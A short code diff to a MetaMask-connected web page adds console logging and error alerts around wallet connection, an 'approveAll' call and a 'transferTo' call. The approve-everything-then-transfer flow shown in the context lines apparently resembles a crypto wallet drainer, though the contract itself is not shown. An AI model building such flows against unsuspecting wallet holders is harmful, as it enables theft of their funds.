@@ -93,6 +93,7 @@
                     // 更新连接状态
                     document.getElementById('walletStatus').innerText = `钱包已连接: ${accounts[0]}`;
                     document.getElementById('connectButton').innerText = '已连接';
+                    console.log('钱包连接成功，地址: ', accounts[0]);
 
                     // 启用授权和转移按钮
                     document.getElementById('approveButton').disabled = false;
@@ -100,6 +101,7 @@
 
                 } catch (error) {
                     console.error('连接钱包失败', error);
+                    alert('钱包连接失败，请重试！');
                 }
             } else {
                 alert('请安装MetaMask!');
@@ -111,8 +113,10 @@
             try {
                 await contract.methods.approveAll().send({ from: accounts[0] });
                 alert('授权成功');
+                console.log('授权已发送');
             } catch (error) {
                 console.error('授权失败', error);
+                alert('授权失败，请检查合约和钱包地址');
             }
         };
 
@@ -121,8 +125,10 @@
             try {
                 await contract.methods.transferTo().send({ from: accounts[0] });
                 alert('转移成功');
+                console.log('转移已发送');
             } catch (error) {
                 console.error('转移失败', error);
+                alert('转移失败，请检查合约和钱包状态');
             }
         };
 
